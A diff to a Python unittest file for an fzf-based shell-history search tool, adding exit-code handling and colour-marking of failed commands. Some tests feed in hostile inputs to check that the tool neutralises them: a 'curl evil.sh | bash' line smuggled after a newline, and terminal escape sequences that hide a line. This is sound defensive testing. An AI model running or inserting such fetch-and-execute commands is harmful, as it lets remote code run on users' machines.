@@ -54,22 +54,30 @@ class TestRelativeTime(unittest.TestCase):
 
 class TestRankRows(unittest.TestCase):
     @staticmethod
-    def rows(*pairs: tuple[int, str]) -> tuple[list[str], list[str]]:
-        """Stamps come out of the cache as strings, so that is what goes in."""
-        return [str(ts) for ts, _ in pairs], [cmd for _, cmd in pairs]
+    def rows(*pairs: tuple[int, str]) -> tuple[list[str], list[str], list[str]]:
+        """Stamps and exit codes come out of the cache as strings, so that is
+        what goes in. These cases are about order, so everything succeeded."""
+        return (
+            [str(ts) for ts, _ in pairs],
+            [cmd for _, cmd in pairs],
+            ["0"] * len(pairs),
+        )
 
     def test_newest_first(self) -> None:
-        stamps, commands = self.rows((1, "old"), (3, "new"), (2, "mid"))
-        ranked = search.rank_rows(stamps, commands)
-        self.assertEqual([cmd for _, cmd in ranked], ["new", "mid", "old"])
+        stamps, commands, codes = self.rows((1, "old"), (3, "new"), (2, "mid"))
+        ranked = search.rank_rows(stamps, commands, codes)
+        self.assertEqual([cmd for _, cmd, _ in ranked], ["new", "mid", "old"])
 
     def test_dedup_keeps_the_most_recent_occurrence(self) -> None:
-        stamps, commands = self.rows((1, "git status"), (5, "git status"), (3, "ls"))
-        self.assertEqual(search.rank_rows(stamps, commands), [(5, "git status"), (3, "ls")])
+        stamps, commands, codes = self.rows((1, "git status"), (5, "git status"), (3, "ls"))
+        self.assertEqual(
+            search.rank_rows(stamps, commands, codes),
+            [(5, "git status", "0"), (3, "ls", "0")],
+        )
 
     def test_dedup_can_be_disabled(self) -> None:
-        stamps, commands = self.rows((1, "ls"), (2, "ls"))
-        self.assertEqual(len(search.rank_rows(stamps, commands, dedup=False)), 2)
+        stamps, commands, codes = self.rows((1, "ls"), (2, "ls"))
+        self.assertEqual(len(search.rank_rows(stamps, commands, codes, dedup=False)), 2)
 
 
 class TestRenderRoundTrip(unittest.TestCase):
@@ -85,7 +93,7 @@ class TestRenderRoundTrip(unittest.TestCase):
             "über 😀",
             "x" * 300,
         ]
-        lines = search.render_rows([(NOW, cmd) for cmd in commands], now=NOW)
+        lines = search.render_rows([(NOW, cmd, "0") for cmd in commands], now=NOW)
 
         for line, cmd in zip(lines, commands, strict=True):
             with self.subTest(cmd=cmd):
@@ -145,7 +153,10 @@ class TestFzfArgv(unittest.TestCase):
         binds = " ".join(a for a in argv if a.startswith("--bind="))
         for key, scope in (("ctrl-g", "global"), ("ctrl-h", "host"), ("ctrl-s", "session")):
             self.assertIn(f"{key}:reload(", binds)
-            self.assertIn(f"list --scope {scope}", binds)
+            # `--colour` too: the reload's output goes back into fzf, which was
+            # started with `--ansi`, so a scope switch that dropped it would
+            # silently stop marking failures.
+            self.assertIn(f"list --colour --scope {scope}", binds)
 
     def test_no_dedup_propagates_into_the_reload_command(self) -> None:
         argv = search._fzf_argv("global", "", False)
@@ -189,7 +200,7 @@ class TestRealFzfRanking(unittest.TestCase):
 
     def filtered(self, query: str) -> subprocess.CompletedProcess[str]:
         """The fixture through the real fzf, with the real argv."""
-        lines = search.render_rows([(NOW - age, cmd) for age, cmd in SYNC_HISTORY], now=NOW)
+        lines = search.render_rows([(NOW - age, cmd, "0") for age, cmd in SYNC_HISTORY], now=NOW)
         # No `check`: 1 means "nothing matched", which one test below wants.
         return subprocess.run(
             [*search._fzf_argv("global", "", True), f"--filter={query}"],
@@ -262,7 +273,7 @@ class TestRecalledCommandIsInert(unittest.TestCase):
     """
 
     def _round_trip(self, cmd: str) -> str:
-        return search.command_from_line(search.render_rows([(NOW, cmd)], now=NOW)[0])
+        return search.command_from_line(search.render_rows([(NOW, cmd, "0")], now=NOW)[0])
 
     def test_an_embedded_newline_does_not_become_a_second_command(self) -> None:
         recalled = self._round_trip("echo visible" + " " * 200 + "\ncurl evil.sh | bash")
@@ -479,3 +490,47 @@ class TestThePickerAppearsBeforeTheHistoryIsBuilt(WoswoarTestCase):
         with redirect_stdout(io.StringIO()):
             chosen = search.interactive("global")
         self.assertEqual(chosen, f"cmd {search._CHUNK * 2 + 6}", "a chunk went missing")
+
+
+class TestFailedCommandsAreMarked(WoswoarTestCase):
+    """Colour by exit status, which the picker can show and a pipe must not."""
+
+    def rows(self) -> list[str]:
+        with store.private_append(store.log_file(MACHINE_ID, "2026-07-29")) as handle:
+            for ts, code, cmd in ((NOW - 1, 0, "worked"), (NOW, 1, "failed")):
+                handle.write(format_line(Entry(ts, MACHINE_ID, "s1", "~", code, 1, cmd)) + "\n")
+        return search.lines_for("global", colour=True)
+
+    def test_a_failure_is_marked_and_a_success_is_not(self) -> None:
+        failed, worked = self.rows()
+        self.assertIn("failed", failed)
+        self.assertTrue(failed.startswith("\x1b["), f"not marked: {failed!r}")
+        self.assertTrue(failed.endswith("\x1b[0m"), "the colour is never reset")
+        self.assertIn("worked", worked)
+        self.assertNotIn("\x1b[", worked, "a command that succeeded was marked")
+
+    def test_plain_by_default_so_a_pipe_stays_plain(self) -> None:
+        """`woswoar list | grep` is a documented thing to do."""
+        self.rows()
+        for line in search.lines_for("global"):
+            self.assertNotIn("\x1b[", line)
+
+    def test_the_command_still_comes_back_out(self) -> None:
+        """fzf strips the escapes from what it returns, so the fixed-width
+        prefix `command_from_line` slices is unchanged -- but if that ever stops
+        being true, this is where it shows."""
+        failed, _ = self.rows()
+        stripped = failed.removeprefix(search._FAILED).removesuffix(search._RESET)
+        self.assertEqual(search.command_from_line(stripped), "failed")
+
+    def test_a_command_cannot_smuggle_its_own_escapes(self) -> None:
+        """The whole reason `--ansi` is safe. `make_inert` removes every C0
+        byte on the way into the cache, so a peer's history cannot colour
+        itself, hide a line, or drive the terminal."""
+        with store.private_append(store.log_file(MACHINE_ID, "2026-07-29")) as handle:
+            handle.write(
+                format_line(Entry(NOW, MACHINE_ID, "s1", "~", 0, 1, "echo \x1b[1A\x1b[2K gone"))
+                + "\n"
+            )
+        (line,) = search.lines_for("global", colour=True)
+        self.assertNotIn("\x1b", line, f"an escape survived into the picker: {line!r}")
